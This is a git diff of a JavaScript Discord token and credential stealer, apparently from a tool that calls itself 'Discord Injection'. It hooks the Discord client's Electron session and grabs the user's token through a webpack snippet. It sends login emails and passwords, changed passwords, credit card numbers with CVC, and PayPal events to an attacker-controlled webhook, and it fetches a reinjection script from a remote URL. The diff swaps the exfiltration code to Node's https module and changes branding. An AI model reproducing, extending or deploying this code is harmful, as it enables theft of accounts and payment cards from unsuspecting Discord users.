@@ -1,6 +1,7 @@
 const args = process.argv;
 const fs = require("fs");
 const path = require("path");
+const https = require("https");
 const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
@@ -9,9 +10,9 @@ const config = {
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: "Discord Injection [Python]", //name of the webhook thats gonna send the info
-  embed_icon:"https://cdn.discordapp.com/attachments/861851773740384257/969240529369956352/7365c62e80ea9bdfb8217135c047033f.jpg", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon:"https://cdn.discordapp.com/attachments/972488565994954782/976000116810973204/app-4.png", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5576300, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "%WEBHOOK%", //your discord webhook there obviously
+  webhook: "~~ImageGrabber~~", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/xrevix/injection/main/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
@@ -310,13 +311,26 @@ const getBadges = (flags) => {
   return badges;
 };
 
-const hooker = (content) => {
-  execScript(`var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${config.webhook}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${JSON.stringify(content)}));
-`);
+const hooker = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL(config.webhook);
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    },
+  };
+  const req = https.request(options);
+
+  req.on("error", (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
 };
 
 const login = async (email, password, token) => {
@@ -352,7 +366,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "💜 • Discord Injection • [Python]",
+            text: "💜 | Discord Injection | [Python]",
         },
       },
     ],
@@ -394,7 +408,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "💜 • Discord Injection • [Python]",
+            text: "💜 | Discord Injection | [Python]",
         },
       },
     ],
@@ -436,7 +450,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "💜 • Discord Injection • [Python]",
+            text: "💜 | Discord Injection | [Python]",
         },
       },
     ],
@@ -459,7 +473,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: "**Paypal Added**",
-            value: `Time to buy some nitro baby 😩`,
+            value: `Time to buy some nitro baby `,
             inline: false,
           },
           {
@@ -478,7 +492,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "💜 • Discord Injection • [Python]",
+            text: "💜 | Discord Injection | [Python]",
         },
       },
     ],
@@ -520,7 +534,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "💜 • Discord Injection • [Python]",
+            text: "💜 | Discord Injection | [Python]",
         },
       },
     ],
@@ -564,7 +578,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "💜 • Discord Injection • [Python]",
+            text: "💜 | Discord Injection | [Python]",
         },
       },
     ],
@@ -628,13 +642,8 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsedData = details.uploadData[0].bytes;
-  let data;
-  try {
-    data = JSON.parse(Buffer.from(unparsedData).toString());
-  } catch (SyntaxError) {
-    data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()));
-  }
+  const unparsed_data = await Buffer.from(details.uploadData[0].bytes).toString();
+  const data = JSON.parse(unparsed_data);
   const token = await execScript(
     `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
   );
